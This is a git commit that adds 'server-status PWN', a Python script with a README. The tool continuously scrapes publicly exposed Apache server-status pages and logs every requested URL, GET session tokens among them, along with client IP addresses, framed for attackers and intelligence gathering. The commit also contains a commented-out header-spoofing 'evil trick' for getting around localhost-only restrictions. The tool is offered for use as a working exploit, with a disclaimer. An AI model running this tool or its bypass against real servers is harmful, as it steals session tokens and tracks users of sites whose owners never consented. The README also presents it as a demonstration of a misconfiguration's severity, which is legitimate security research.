d1d2f729b66df3e5f719ed245c042f8a8a8aeaad
Mazin Ahmed <mazin@mazinahmed.net>
2017-01-14 00:38:06 +0300

    Initial Commit.

---
+++ README.md
@@ -0,0 +1,63 @@
+*server-status PWN*
+=====================
+
+### A script that monitors and extracts requested URLs and clients connected to the service by exploiting publicly accessible Apache server-status instances ###
+
+
+## What is Apache server-status? ##
+Apache server-status is an Apache monitoring instance, available by default at `http://example.com/server-status`. In normal cases, the server-status instance is not accessible by non-local origin IPs. However, due to misconfiguration, it can be publicly accessible. This leads anyone to view the great amount of data by server-status.
+
+A part of "interesting/severe" data to long-term attackers and red-teamers is the exposure of clients' IP addresses and requested URLs on the Apache service, which an exposed Apache server-status provides. Also, Apache server-status output is viewed on the real-time.
+
+## What type of data can be exposed? ##
+* All requested URLs by all Hosts/VHosts on the Apache server.
+	* This includes:
+		* Hidden and obscure files and directories.
+		* Session Tokens on GET REQUEST_URI (eg.. `https://example.com/?token=123`). If tokens are passed through GET HTTP method, it will be exposed, no matter what SSL encryption is used.
+* All clients' IP addresses along with URLs the clients have requested.
+
+## What do we need as attackers? ##
+We need a script that constantly monitors the exposed Apache server-status, and extracts all new URLs, and save them for later testing.
+
+Also, if we are performing an intelligence engagement, we would need all IPs that interacts with the Apache server that hosts our target website, along with requested URLs. Then we need to constantly monitor the service on the hour.
+
+
+# Introducing *server-status PWN* #
+server-status PWN constantly requests and parse Apache server-status page for any new event. Whenever a new URL is requested and a new client IP address is used, it will be logged and reported.
+
+It outputs the data in a SQLITE3 database, and includes an option for saving unique URLs in a newline-delimited file.
+
+
+##**Usage**##
+`python server-status_PWN.py --url 'http://example.com/server-status'`
+
+
+##**Why I created this?**##
+* To prove the severity of having an exposed Apache server-status. 
+* `PoC || GO` supporter.
+* I needed an actual PoC exploit.
+
+#**Requirements**#
+* Python2 or Python3
+* requests
+* bs4
+
+
+##**Example Output**##
+![server-status_PWN Example Output](https://www.dropbox.com/s/rplstyr5lqlmxq5/server-status_PWN-Demo.png?dl=1)
+
+
+#**Legal Disclaimer**#
+This project is made for educational and ethical testing purposes only. Usage of server-status_PWN for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.
+
+
+#**License**#
+The project is licensed under MIT License.
+
+#**Author**#
+*Mazin Ahmed*
+* Website: [https://mazinahmed.net](https://mazinahmed.net)
+* Email: *mazin AT mazinahmed DOT net*
+* Twitter: [https://twitter.com/mazen160](https://twitter.com/mazen160)
+* Linkedin: [http://linkedin.com/in/infosecmazinahmed](http://linkedin.com/in/infosecmazinahmed)
+
---
+++ server-status_PWN.py
@@ -0,0 +1,326 @@
+#!/usr/bin/env python
+# coding=utf-8
+########################################################################
+###server-status_PWN
+#Description:
+#A script that monitors and extracts URLs from Apache server-status.
+###Version:
+#0.1
+###Homepage:
+#https://github.com/mazen160/server-status_PWN
+##Author:
+#Mazin Ahmed <Mazin AT MazinAhmed DOT net>
+########################################################################
+
+import time
+import sqlite3
+import calendar
+import argparse
+
+import requests
+from bs4 import BeautifulSoup
+
+parser = argparse.ArgumentParser()
+parser.add_argument("-u","--url", dest="url",help="The Apache server-status URL.", action='store',required=True)
+parser.add_argument("--sleeping-time", dest="sleeping_time",help="Sleeping time between each request. (Default: 10)", action='store',default=10)
+parser.add_argument("--db", dest="db",help="Outputs database path. (Default: /tmp/server-status_PWN.db).",default='/tmp/server-status_PWN.db', action='store')
+parser.add_argument("-o","--output", dest="output_path",help="Saves output constantly into a newline-delimited output file.", action='store')
+parser.add_argument("--enable-full-logging", dest="enable_full_logging",help="Enable full logging for all requests with timestamps of each request.", default=False, action='store_true')
+
+args = parser.parse_args()
+
+url = args.url
+if args.db:
+	db = str(args.db)
+else:
+	db = ''
+if args.output_path:
+	output_path = str(args.output_path)
+else:
+	output_path = ''
+if args.sleeping_time:
+	sleeping_time = args.sleeping_time
+else:
+	sleeping_time = ''
+
+enable_full_logging = args.enable_full_logging
+
+class tcolor:
+	'''
+	A simple coloring class.
+	'''
+	endcolor = '\033[0m'
+	red = '\033[31m'
+	green = '\033[32m'
+	purple = '\033[35m'
+	yellow = '\033[93m'
+	light_blue = '\033[96m'
+
+
+
+class Request_Handler():
+	'''
+	Handles anything related to requests.
+	Manually modify the __init__ variables for customzing.
+	'''
+	def __init__(self):
+		self.user_agent = 'server-status_PWN (https://github.com/mazen160/server-status_PWN)'
+		self.timeout = '3'
+		self.origin_ip = '127.0.0.1'
+		self.additional_headers = {} # Fill this dict with additional headers if needed. # It will work normally by default.
+	def send_request(self, url):
+		'''
+		Sends requests.
+		'''
+		headers = {"User-Agent": self.user_agent, 'Accept': '*/*'}
+		headers.update(self.additional_headers)
+		'''
+		# I will leave this evil trick for you.
+		# Uncomment these lines to activate it.
+		conf_breaking_headers = {"X-Originating-IP": self.origin_ip, "X-Forwarded-For": self.origin_ip, "X-Remote-IP": self.origin_ip, "X-Remote-Addr": self.origin_ip}
+		headers.update(conf_breaking_headers)
+		'''
+
+		try:
+			try:
+				requests.packages.urllib3.disable_warnings()
+			except:
+				pass
+			req = requests.get(url,headers=headers,timeout=int(self.timeout), verify=False, allow_redirects=False)
+			output = str(req.content)
+		except:
+			output = ''
+		return(output)
+
+
+
+class Response_Handler():
+	'''
+	Handles validation and parsing of response.
+	'''
+
+	def validate_response(self, response):
+		'''
+		Validates the response, and checks whether the output is valid.
+		'''
+		valid_patterns = ['<h1>Apache Server Status for']
+		for pattern in valid_patterns:
+			if pattern in response:
+				return(True)
+
+		return(False)
+
+	def parse_response(self, response):
+		'''
+		Parses Apache serve-status response.
+		'''
+
+		VHOST_List = []
+		REQUEST_URI_List = []
+		FULL_URL_List = []
+		CLIENT_IP_ADDRESS_List = []
+
+		# URL-related.
+		soup = BeautifulSoup(response,'lxml')
+		try:
+			table_index_id = 0
+			VHOST_index_id = -2
+			REQUEST_URI_index_id = -1
+			CLIENT_IP_ADDRESS_index_id = -3
+
+			for _ in range(len(soup.findChildren('table')[table_index_id].findChildren('tr'))):
+				if _ != 0:
+					try:
+						VHOST = soup.findChildren('table')[table_index_id].findChildren('tr')[_].findChildren('td')[VHOST_index_id].getText()
+					except:
+						VHOST = ''
+					try:
+						REQUEST_URI = soup.findChildren('table')[table_index_id].findChildren('tr')[_].findChildren('td')[REQUEST_URI_index_id].getText().split(' ')[1]
+					except:
+						REQUEST_URI = ''
+					try:
+						if (VHOST == REQUEST_URI == ''):
+							FULL_URL = ''
+						else:
+							FULL_URL = 'http://'+str(VHOST)+str(REQUEST_URI)
+					except:
+						FULL_URL = ''
+
+					VHOST_List.append(VHOST)
+					REQUEST_URI_List.append(REQUEST_URI)
+					FULL_URL_List.append(FULL_URL)
+
+					# Client-related.
+					try:
+						CLIENT_IP_ADDRESS = soup.findChildren('table')[table_index_id].findChildren('tr')[_].findChildren('td')[CLIENT_IP_ADDRESS_index_id].getText()
+					except:
+						CLIENT_IP_ADDRESS = ''
+
+					CLIENT_IP_ADDRESS_List.append(CLIENT_IP_ADDRESS)
+
+		except:
+			pass
+		output = {"VHOST": VHOST_List, "REQUEST_URI": REQUEST_URI_List , "FULL_URL": FULL_URL_List, "CLIENT_IP_ADDRESS": CLIENT_IP_ADDRESS_List}
+		return(output)
+
+
+def output_to_file(output_data):
+	'''
+	Outputs identified URLs into a newline-delimited file.
+	'''
+	try:
+		o_file = open(output, 'a')
+		o_file.write(str(output_data)+'\n')
+		o_file.close()
+	except:
+		print('%s[!] Error writing to file. %s' %(tcolor.red, tcolor.endcolor))
+		return(1)
+	return(0)
+
+
+class DBHandler():
+	def __init__(self):
+		global db
+		try:
+			self.conn = sqlite3.connect(db)
+			self.c = self.conn.cursor()
+		except:
+			print('%s[!] Error: SQLITE3-related error.%s'%(tcolor.red, tcolor.endcolor))
+			print('\nExiting...')
+			exit(0)
+
+
+	def DB_initialize(self):
+		'''
+		Initialize the DB.
+		'''
+		self.c.execute("""CREATE TABLE IF NOT EXISTS "Data"( "FULL_URL" TEXT, "VHOST" TEXT, "REQUEST_URI" TEXT)""")
+		self.c.execute("""CREATE TABLE IF NOT EXISTS "Identified_Clients"("IP_Address" TEXT)""")
+		self.c.execute("""CREATE TABLE IF NOT EXISTS "Full_Logs"("Timestamp" TEXT, "IP_Address" TEXT, "VHOST" TEXT, "REQUEST_URI" TEXT, "FULL_URL" TEXT)""")
+
+		self.conn.commit()
+
+
+	def Add_Identified_URL(self, VHOST, REQUEST_URI, FULL_URL):
+		'''
+		Adds identified URL into DB.
+		'''
+
+		self.c.execute("""INSERT INTO Data VALUES(?,?,?)""",(FULL_URL,VHOST,REQUEST_URI,))
+		self.conn.commit()
+		return(0)
+
+
+	def Add_Identified_Client(self, IP_Address):
+		'''
+		Adds identified Cleint's IP address into DB.
+		'''
+		self.c.execute("""INSERT INTO Identified_Clients VALUES(?)""",(IP_Address,))
+		self.conn.commit()
+		return(0)
+
+
+	def Add_Full_Log(self, Timestamp, IP_Address, VHOST, REQUEST_URI, FULL_URL):
+		'''
+		Responsible for adding data into Full_Logs.
+		'''
+		self.c.execute("""INSERT INTO Full_Logs VALUES(?,?,?,?,?)""",(Timestamp, IP_Address, VHOST, REQUEST_URI, FULL_URL,))
+		self.conn.commit()
+		return(0)
+
+
+	def Check_If_URL_Exists(self, FULL_URL):
+		'''
+		Checks if the URL exists on the DB.
+		'''
+		self.c.execute("""SELECT "FULL_URL" FROM "Data" """)
+		output = self.c.fetchall()
+		for _ in output:
+			if ( _[0] == FULL_URL):
+				return(True)
+
+		return(False)
+
+
+	def Check_If_Client_Exists(self, IP_Address):
+		'''
+		Checks if the Client's IP address exists on the DB.
+		'''
+		self.c.execute("""SELECT "IP_Address" FROM "Identified_Clients" """)
+		output = self.c.fetchall()
+		for _ in output:
+			if ( _[0] == IP_Address):
+				return(True)
+
+		return(False)
+
+
+def main(url, full_logging=False):
+	DBHandler().DB_initialize()
+	error_limit = 20
+	error_counter = 0
+	while True:
+		print('%s[#] Requesting. %s' %(tcolor.light_blue, tcolor.endcolor))
+		output = Request_Handler().send_request(url)
+		validate_output = Response_Handler().validate_response(output)
+		if validate_output != True:
+			print('%s[!] Output does not seem to be valid.%s' %(tcolor.red, tcolor.endcolor) )
+			print('Trying again, feel free to exit [CTRL+C] and debug the issue.')
+			error_counter = error_counter+1
+			if (error_limit <= error_counter ):
+				print('%s[!] Too many errors.%s'%(tcolor.red, tcolor.endcolor) )
+				print('\nExiting...')
+				exit(1)
+			else:
+				pass
+		else:
+			parsed_output = Response_Handler().parse_response(output)
+
+			for _ in range(len(parsed_output['FULL_URL'])):
+				if ( DBHandler().Check_If_URL_Exists(parsed_output['FULL_URL'][_]) == False ) and ( parsed_output['FULL_URL'][_] != ''):
+					try:
+						DBHandler().Add_Identified_URL(parsed_output['VHOST'][_], parsed_output['REQUEST_URI'][_], parsed_output['FULL_URL'][_])
+					except:
+						print('%s[!] Error: There was an error in adding a URL into DB.%s'%(tcolor.red, tcolor.endcolor))
+					print('%s[New URL]: %s %s%s%s' %(tcolor.yellow, tcolor.endcolor, tcolor.green, str(parsed_output['FULL_URL'][_]), tcolor.endcolor))
+					if (output_path != ''):
+						output_to_file(str(parsed_output['FULL_URL'][_]))
+
+			for _ in range(len(parsed_output['CLIENT_IP_ADDRESS'])):
+				if ( DBHandler().Check_If_Client_Exists(parsed_output['CLIENT_IP_ADDRESS'][_]) == False):
+					DBHandler().Add_Identified_Client(parsed_output['CLIENT_IP_ADDRESS'][_])
+					print('%s[New Client]: %s%s' %(tcolor.purple,parsed_output['CLIENT_IP_ADDRESS'][_], tcolor.endcolor) )
+
+			#Full Logging, if enabled:
+			if (full_logging == True):
+				for _ in range(len(parsed_output['FULL_URL'])):
+					Timestamp = calendar.timegm(time.gmtime())
+					try:
+						IP_Address = parsed_output['CLIENT_IP_ADDRESS'][_]
+					except:
+						IP_Address = ''
+					try:
+						VHOST = parsed_output['VHOST'][_]
+					except:
+						VHOST = ''
+					try:
+						REQUEST_URI = parsed_output['REQUEST_URI'][_]
+					except:
+						REQUEST_URI = ''
+					try:
+						FULL_URL = parsed_output['FULL_URL'][_]
+					except:
+						FULL_URL = ''
+					DBHandler().Add_Full_Log(Timestamp, IP_Address, VHOST, REQUEST_URI, FULL_URL)
+
+
+		time.sleep(int(sleeping_time))
+	return(0)
+
+
+
+try:
+	main(url, full_logging=enable_full_logging)
+except KeyboardInterrupt:
+	print('\nExiting...')
+	exit(0)
